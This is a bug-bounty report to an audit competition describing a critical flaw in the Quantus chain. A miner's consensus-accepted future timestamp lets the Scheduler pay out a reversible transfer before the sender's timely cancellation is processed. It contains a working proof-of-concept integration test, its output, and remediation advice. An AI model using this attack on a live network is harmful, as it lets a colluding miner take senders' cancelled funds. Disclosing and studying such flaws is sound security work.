# 89438 bc critical miner controlled future timestamps bypass reversible transfer cancellation windows and cause direct loss of funds

**Submitted on Aug 19th 2026 at 11:01:31 UTC by @Pig46940 for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89438
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Direct loss of funds

## Description

## Brief/Intro

Quantus allows a reversible transfer to use a timestamp delay as short as 12 seconds, but its timestamp inherent accepts a block timestamp almost 30 seconds ahead of the importing node's clock. The timestamp-aware Scheduler processes pending transfers during `on_initialize`, before the current block's inherent and signed extrinsics. A miner can therefore publish an accepted future timestamp that makes a pending transfer eligible in the following block. Even if the sender's cancellation is included well before the promised deadline, Scheduler executes first, pays the recipient, removes the pending transfer, and causes the cancellation to fail with `PendingTxNotFound`.

## Vulnerability Details

For the entire delay selected by a sender, a reversible transfer must remain pending and cancellable. A block producer acting within the timestamp range accepted by consensus must not be able to shorten that window.

This is also the behavior described in the Quantus documentation: funds remain in escrow during the delay window, the sender can cancel during that window, and the transfer executes only after the delay expires(<https://docs.quantus.com/deep-dives/safety/>).

### Quantus permits a 12-second timestamp delay

The target block time is 12,000 milliseconds:

```rust
pub const TARGET_BLOCK_TIME_MS: u64 = 12_000;
```

The runtime uses that value as the minimum timestamp-based reversible-transfer delay. It also configures a 24-second scheduler bucket and a timestamp minimum period of only 100 milliseconds:

```rust
       /// Target block time ms
       pub const TargetBlockTime: u64 = TARGET_BLOCK_TIME_MS;
       pub const TimestampBucketSize: u64 = 2 * TARGET_BLOCK_TIME_MS; // Nyquist frequency
       // ... 
       pub const MinimumPeriod: u64 = 100;
```

```rust
impl pallet_reversible_transfers::Config for Runtime {
      // ...
      type MinDelayPeriodMoment = TargetBlockTime;
      // ... 
      type TimeProvider = Timestamp;
}
```

`schedule_transfer_with_delay` accepts either a block-number delay or a millisecond delay. Timestamp delays are accepted when they are at least `MinDelayPeriodMoment`:

```rust
				BlockNumberOrTimestamp::Timestamp(t) => {
					ensure!(*t >= T::MinDelayPeriodMoment::get(), Error::<T>::DelayTooShort)
				},
```

The timestamp target is calculated from the current on-chain timestamp:

```rust
				BlockNumberOrTimestamp::Timestamp(millis) =>
					DispatchTime::After(BlockNumberOrTimestamp::Timestamp(
						T::TimeProvider::now().saturating_add(millis),
					)),
```

### Consensus accepts timestamps up to 30 seconds in the future

The Timestamp pallet accepts a claimed timestamp as long as it is not more than 30 seconds ahead of the importing node's inherent timestamp:

```rust
		fn check_inherent(
			call: &Self::Call,
			data: &InherentData,
		) -> result::Result<(), Self::Error> {
			const MAX_TIMESTAMP_DRIFT_MILLIS: sp_timestamp::Timestamp =
				sp_timestamp::Timestamp::new(30 * 1000);

			let t: u64 = match call {
				Call::set { ref now } => (*now).saturated_into::<u64>(),
				_ => return Ok(()),
			};

			let data = data
				.get_data::<InherentType>(&INHERENT_IDENTIFIER)
				.expect("Timestamp inherent data not correctly encoded")
				.expect("Timestamp inherent data must be provided");

			let minimum = (Now::<T>::get() + T::MinimumPeriod::get()).saturated_into::<u64>();
			if t > *(data + MAX_TIMESTAMP_DRIFT_MILLIS) {
				Err(InherentError::TooFarInFuture)
			} else if t < minimum {
				Err(InherentError::TooEarly)
			} else {
				Ok(())
			}
		}
```

This check is part of the production QPoW import path. `import_block` calls `check_inherents`, which is gated by a block-height threshold before it validates anything:

```rust
async fn check_inherents(
     &self,
     block: B,
     at_hash: B::Hash,
     inherent_data_providers: CIDP::InherentDataProviders,
 ) -> Result<(), Error<B>> {
     if *block.header().number() < self.check_inherents_after {
         return Ok(());
     }
     let inherent_data = inherent_data_providers.create_inherent_data().await?;
     self.client.runtime_api().check_inherents(at_hash, block.into(), inherent_data)?;
     // ...
}
```

The node sets `check_inherents_after` to `0` (`node/src/service.rs`) and supplies the node's real system clock as the inherent data via `from_system_time()`, so the gate above is never taken and the comparison is always against a genuine wall-clock reading.

Therefore, the PoC is exercising the same timestamp acceptance rule used when a node imports a production block.

### Scheduler executes before cancellation extrinsics

Timestamp agendas are processed in Scheduler's `on_initialize` using `T::TimeProvider::now()`. At this point, the current block's timestamp inherent has not executed, so Scheduler sees the timestamp inherited from the preceding block:

```rust
fn on_initialize(now: BlockNumberFor<T>) -> Weight {
			// ...
			// Process timestamp-based agendas using current system time
			// This ensures no buckets are skipped if block times are longer than bucket intervals
			let current_timestamp = T::TimeProvider::now();

			log::debug!(target: "scheduler", "on_initialize: current_timestamp: {:?}", current_timestamp);
			if current_timestamp > T::Moment::zero() {
				// Consume base weight for timestamp-based agenda housekeeping
				// (IncompleteTimestampSince and LastProcessedTimestamp reads/writes)
				if weight_counter
					.try_consume(T::WeightInfo::service_timestamp_agendas_base())
					.is_err()
				{
					return weight_counter.consumed();
				}

				Self::service_timestamp_agendas(
					&mut weight_counter,
					&mut executed,
					current_timestamp,
					u32::MAX,
				);
			}
}
```

Because pallet hooks execute before block extrinsics, a cancellation included in that block cannot race Scheduler. Once Scheduler has executed the transfer, `PendingTransfers` has been removed and the cancellation fails with `PendingTxNotFound`.

### Concrete attack sequence

The PoC uses an initial timestamp of `35,000 ms` because it makes the bucket transition explicit:

{% stepper %}
{% step %}

## In block 1, schedule the transfer

The sender schedules a transfer with the production minimum delay of 12,000 ms. The timestamp target is therefore 47,000 ms.
{% endstep %}

{% step %}

## Quantus places the call in a timestamp agenda

Quantus places the call in timestamp agenda 72,000. Due to bucket normalization, a preceding timestamp of 65,000 normalizes to 72,000 and causes that agenda to be serviced.
{% endstep %}

{% step %}

## In block 2, claim a consensus-accepted future timestamp

An attacker who wins a QPoW block claims timestamp 65,000 while the importing node's simulated wall clock is 35,100. The timestamp is only 29,900 ms ahead and passes `check_inherent`.
{% endstep %}

{% step %}

## In block 3, Scheduler executes the pending transfer

Only another 100 ms of simulated wall time has passed. Scheduler's `on_initialize` sees the preceding timestamp of 65,000 and executes the pending transfer before any block-3 extrinsic.
{% endstep %}

{% step %}

## The current block timestamp passes validation

The current block timestamp also passes inherent validation because the runtime permits 100 ms timestamp increments.
{% endstep %}

{% step %}

## The sender's cancellation fails

The sender's cancellation is dispatched in block 3, only 200 ms after scheduling and well inside the selected 12-second window. It fails with `PendingTxNotFound` because the recipient has already been paid.
{% endstep %}
{% endstepper %}

The control branch uses the same accounts, amount, delay, blocks, and cancellation. Its only difference is that timestamps advance with the simulated wall clock. In that branch, cancellation succeeds and the recipient receives nothing.

The attack is timing- and bucket-alignment-dependent, but it is directly reachable. A malicious recipient or cooperating miner can target pending transfers whose timestamp phase is covered by the permitted drift. The attack requires winning a QPoW block, not majority hash power, a privileged address, leaked credentials, or a malicious genesis block. The following block may be produced by any miner; Scheduler deterministically executes before its signed extrinsics.

### Root cause and scope

The root cause is not the existence of a conventional timestamp-drift allowance by itself. The vulnerability is created by Quantus's original integration of:

* timestamp-based reversible transfers;
* a timestamp-aware Scheduler;
* a minimum security delay of 12 seconds;
* a 24-second timestamp bucket; and
* a consensus-permitted future timestamp drift of 30 seconds.

Quantus treats a miner-influenced timestamp as the clock for a security-critical cancellation guarantee, while allowing the promised minimum window to be shorter than the accepted manipulation range. The vulnerable feature and the unsafe runtime coupling are Quantus-specific.

## Impact Details

The selected impact is **Critical: Direct loss of funds**.

This is not merely an earlier delivery of funds that would necessarily have occurred anyway. The PoC includes the sender's cancellation inside the selected delay and establishes two different final ownership outcomes:

```
Control execution
same transfer + same cancellation + honest timestamps
    -> cancellation succeeds
    -> recipient gain = 0

Attack execution
same transfer + same cancellation + consensus-accepted future timestamp
    -> Scheduler pays the recipient before cancellation is dispatched
    -> cancellation fails with PendingTxNotFound
    -> recipient gain = full transfer amount
```

The sender's authorization is conditional and explicitly revocable during the configured window. In the attack branch, the sender exercises that right before the deadline, but the timestamp manipulation changes the final owner of the funds. The recipient receives value that the control execution returns to the sender.

A practical scenario does not require compromised keys. A user may schedule a reversible payment to a counterparty and then detect fraud, an incorrect amount, or another condition requiring cancellation. If that counterparty operates or cooperates with a miner, the counterparty can exploit the timestamp window so that a following block executes the payment before the timely cancellation extrinsic.

This report does not claim permanent freezing, an unauthorized replacement of the destination, or a network shutdown. The concrete impact is loss of the sender's funds through bypass of the protocol-enforced cancellation right.

## Recommended Remediation

The safest remediation is to use block-number delays exclusively for reversible-transfer and high-security cancellation windows.

If timestamp delays remain supported, the execution target must account for the maximum future drift. For example, a requested cancellation duration `delay` should not become eligible before:

```
on_chain_now + delay + maximum_accepted_future_drift
```

The drift should be a shared configurable value rather than an unrelated constant hidden inside timestamp inherent validation. Add an integration test in which the timestamp is advanced to the maximum consensus-accepted value and assert that a minimum-delay transfer remains cancellable until the complete promised wall-clock interval has elapsed.

## References

* Quantus documentation, User Safety Features: <https://docs.quantus.com/deep-dives/safety/>
* Runtime target time, timestamp bucket, and minimum period: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L150-L183>
* Runtime reversible-transfer configuration: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs#L524-L551>
* Timestamp future-drift validation: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/timestamp/src/lib.rs#L285-L327>
* Custom-delay entry point and delay validation: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/reversible-transfers/src/lib.rs#L459-L485>
* Timestamp scheduling target: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/reversible-transfers/src/lib.rs#L768-L805>
* Timestamp Scheduler hook and bucket processing: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/scheduler/src/lib.rs#L377-L422>
* Scheduler timestamp resolution: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/scheduler/src/lib.rs#L668-L715>
* QPoW inherent validation during block import: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/consensus/qpow/src/lib.rs#L168-L198>
* Import path invocation: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/client/consensus/qpow/src/lib.rs#L247-L264>
* Node timestamp provider and block-zero configuration: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/node/src/service.rs#L639-L656>
* Runtime inherent API: <https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/apis.rs#L91-L100>

## Proof of Concept

The PoC is a repository-native runtime integration test. It executes a control branch and an attack branch against the production Quantus runtime configuration.

{% stepper %}
{% step %}

## Add the test-only timestamp dependency

Add this line under `[dev-dependencies]` in `runtime/Cargo.toml`:

```toml
sp-timestamp = { workspace = true, features = ["std"] }
```

{% endstep %}

{% step %}

## Add the integration test

Add the following imports to `runtime/tests/transactions/reversible_integration.rs`:

```rust
use frame_support::{
    assert_err, assert_ok,
    inherent::{InherentData, ProvideInherent},
    traits::{OnFinalize, OnInitialize},
};

use quantus_runtime::{
    Balances, ReversibleTransfers, Runtime, RuntimeOrigin, Scheduler, System, Timestamp,
    EXISTENTIAL_DEPOSIT,
};
```

Append the following code at module scope at the end of that file:

```rust
fn assert_timestamp_accepted(wall_clock: u64, claimed_timestamp: u64) {
    let mut inherent_data = InherentData::new();

    inherent_data
        .put_data(
            sp_timestamp::INHERENT_IDENTIFIER,
            &sp_timestamp::Timestamp::new(wall_clock),
        )
        .expect("timestamp inherent data should encode");

    let call = pallet_timestamp::Call::<Runtime>::set { now: claimed_timestamp };
    let result = <Timestamp as ProvideInherent>::check_inherent(&call, &inherent_data);

    assert!(
        result.is_ok(),
        "claimed timestamp {claimed_timestamp} must be accepted at wall clock \
         {wall_clock}, but validation returned {result:?}"
    );
}

fn begin_block(number: u32) {
    System::set_block_number(number);
    System::on_initialize(number);
    Timestamp::on_initialize(number);

    // Scheduler sees the timestamp inherited from the preceding block.
    Scheduler::on_initialize(number);
}

fn finish_block(number: u32) {
    Scheduler::on_finalize(number);
    Timestamp::on_finalize(number);
    System::on_finalize(number);
}

fn newest_scheduled_transaction() -> sp_core::H256 {
    System::events()
        .iter()
        .rev()
        .find_map(|record| {
            if let quantus_runtime::RuntimeEvent::ReversibleTransfers(
                pallet_reversible_transfers::Event::TransactionScheduled { tx_id, .. },
            ) = &record.event
            {
                Some(*tx_id)
            } else {
                None
            }
        })
        .expect("TransactionScheduled event must exist")
}

fn run_cancellation_case(manipulate_timestamp: bool) -> u128 {
    let mut ext = TestCommons::new_test_ext();

    ext.execute_with(|| {
        let sender = acc(1);
        let attacker_recipient = acc(4);
        let amount = 10 * EXISTENTIAL_DEPOSIT;

        const START: u64 = 35_000;
        const DELAY: u64 = 12_000;

        let recipient_before = Balances::free_balance(&attacker_recipient);

        // Block 1: schedule a transfer using the production minimum delay.
        begin_block(1);
        assert_ok!(Timestamp::set(RuntimeOrigin::none(), START));

        assert_ok!(ReversibleTransfers::schedule_transfer_with_delay(
            RuntimeOrigin::signed(sender.clone()),
            MultiAddress::Id(attacker_recipient.clone()),
            amount,
            BlockNumberOrTimestamp::Timestamp(DELAY),
        ));

        let tx_id = newest_scheduled_transaction();
        assert!(
            pallet_reversible_transfers::PendingTransfers::<Runtime>::contains_key(tx_id)
        );
        finish_block(1);

        // Only 100 ms of simulated wall time passes.
        const WALL_BLOCK_2: u64 = START + 100;
        let timestamp_block_2 = if manipulate_timestamp {
            START + 30_000
        } else {
            WALL_BLOCK_2
        };

        begin_block(2);
        assert_timestamp_accepted(WALL_BLOCK_2, timestamp_block_2);
        assert_ok!(Timestamp::set(RuntimeOrigin::none(), timestamp_block_2));
        finish_block(2);

        // The cancellation is included after only 200 ms, before the 12-second deadline.
        const WALL_BLOCK_3: u64 = START + 200;
        assert!(WALL_BLOCK_3 - START < DELAY);

        let timestamp_block_3 = if manipulate_timestamp {
            START + 30_100
        } else {
            WALL_BLOCK_3
        };

        // Scheduler runs before this block's inherent and signed cancellation extrinsic.
        begin_block(3);

        assert_timestamp_accepted(WALL_BLOCK_3, timestamp_block_3);
        assert_ok!(Timestamp::set(RuntimeOrigin::none(), timestamp_block_3));

        let cancellation =
            ReversibleTransfers::cancel(RuntimeOrigin::signed(sender), tx_id);

        if manipulate_timestamp {
            assert_err!(
                cancellation,
                pallet_reversible_transfers::Error::<Runtime>::PendingTxNotFound
            );

            assert!(
                !pallet_reversible_transfers::PendingTransfers::<Runtime>::contains_key(tx_id)
            );

            assert_eq!(
                Balances::free_balance(&attacker_recipient),
                recipient_before + amount,
                "recipient receives the funds after only 200 ms of wall-clock time"
            );
        } else {
            assert_ok!(cancellation);

            assert_eq!(
                Balances::free_balance(&attacker_recipient),
                recipient_before,
                "recipient must receive nothing when cancellation succeeds"
            );
        }

        finish_block(3);
        Balances::free_balance(&attacker_recipient) - recipient_before
    })
}

#[test]
fn poc_future_timestamp_defeats_reversible_transfer_cancellation() {
    let control_recipient_gain = run_cancellation_case(false);
    let attack_recipient_gain = run_cancellation_case(true);

    println!(
        "control recipient gain = {control_recipient_gain}, \
         attack recipient gain = {attack_recipient_gain}"
    );

    assert_eq!(
        control_recipient_gain, 0,
        "control: sender cancels inside the 12-second window"
    );

    assert_eq!(
        attack_recipient_gain,
        10 * EXISTENTIAL_DEPOSIT,
        "attack: accepted future timestamp transfers funds after only 200 ms"
    );
}
```

{% endstep %}

{% step %}

## Run the test

```bash
cargo test -p quantus-runtime --test mod \
  transactions::reversible_integration::poc_future_timestamp_defeats_reversible_transfer_cancellation \
  -- --nocapture
```

{% endstep %}
{% endstepper %}

### Actual result

```
running 1 test
control recipient gain = 0, attack recipient gain = 10000000000
test transactions::reversible_integration::poc_future_timestamp_defeats_reversible_transfer_cancellation ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 43 filtered out; finished in 0.01s
```

The passing assertions establish that the control recipient gains zero while the attack recipient gains the full transfer amount, and that both future timestamp values pass the production Timestamp pallet's inherent validation.
